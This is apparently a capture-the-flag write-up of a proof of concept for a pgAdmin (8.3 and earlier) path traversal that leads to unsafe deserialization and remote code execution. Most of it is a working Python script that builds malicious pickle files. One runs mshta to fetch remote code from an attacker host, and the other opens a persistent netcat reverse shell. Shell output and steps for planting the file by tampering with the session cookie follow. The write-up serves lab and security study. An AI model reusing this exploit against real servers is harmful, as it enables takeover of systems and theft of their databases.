# DB Administrator

## Summary

pgAdmin (<=8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE)

## PoC

1. Login with a valid user account (Credentials: `player@ctf.dev` / `player123`)
2. Visit the Storage Manager component on Tools section
3. Generate the pickle file using this script:
```
import struct
import sys

def produce_pickle_bytes(platform, cmd):
    b = b'\x80\x04\x95'
    b += struct.pack('L', 22 + len(platform) + len(cmd))
    b += b'\x8c' + struct.pack('b', len(platform)) + platform.encode()
    b += b'\x94\x8c\x06system\x94\x93\x94'
    b += b'\x8c' + struct.pack('b', len(cmd)) + cmd.encode()
    b += b'\x94\x85\x94R\x94.'
    print(b)
    return b

if __name__ == '__main__':
    if len(sys.argv) != 3:
        exit(f"usage: {sys.argv[0]} <attacker_host> <port>")
    HOST, PORT = sys.argv[1], sys.argv[2]

    with open('nt.pickle', 'wb') as f:
        f.write(produce_pickle_bytes('nt', f"mshta.exe http://{HOST}/"))
    with open('posix.pickle', 'wb') as f:
        cmd = (f"nohup sh -c 'while true; do nc {HOST} {PORT} -e /bin/sh; "
               f"sleep 2; done' >/dev/null 2>&1 &")
        f.write(produce_pickle_bytes('posix', cmd))
```

Output:
```
nblirwn@DESKTOP-MGBDK35:/mnt/c/Users/USER/Downloads/WEB/db-administrator/poc$ python3 pickle.py 203.175.125.xxx 1337
b'\x80\x04\x959\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c!mshta.exe http://203.175.125.xxx/\x94\x85\x94R\x94.'
b"\x80\x04\x95{\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c`nohup sh -c 'while true; do nc 203.175.125.xxx 1337 -e /bin/sh; sleep 2; done' >/dev/null 2>&1 &\x94\x85\x94R\x94."
nblirwn@DESKTOP-MGBDK35:/mnt/c/Users/USER/Downloads/WEB/db-administrator/poc$ file posix.pickle
posix.pickle: data
nblirwn@DESKTOP-MGBDK35:/mnt/c/Users/USER/Downloads/WEB/db-administrator/poc$ cat posix.pickle
��{�posix��system����`nohup sh -c 'while true; do nc 203.175.125.xxx 1337 -e /bin/sh; sleep 2; done' >/dev/null 2>&1 &���R�.
```

4. Upload the posix.pickle file
5. Open the browser’s developer tools and change the `pga4_session` cookie value to `../storage/<email>/posix.pickle!a` replacing <email> with the currently logged in user’s email after replacing @ with _ (under 15 seconds sweep)
6. Notice that an HTTP request is performed to the HTTP server, confirming the code execution

I modified this script from the original source: https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/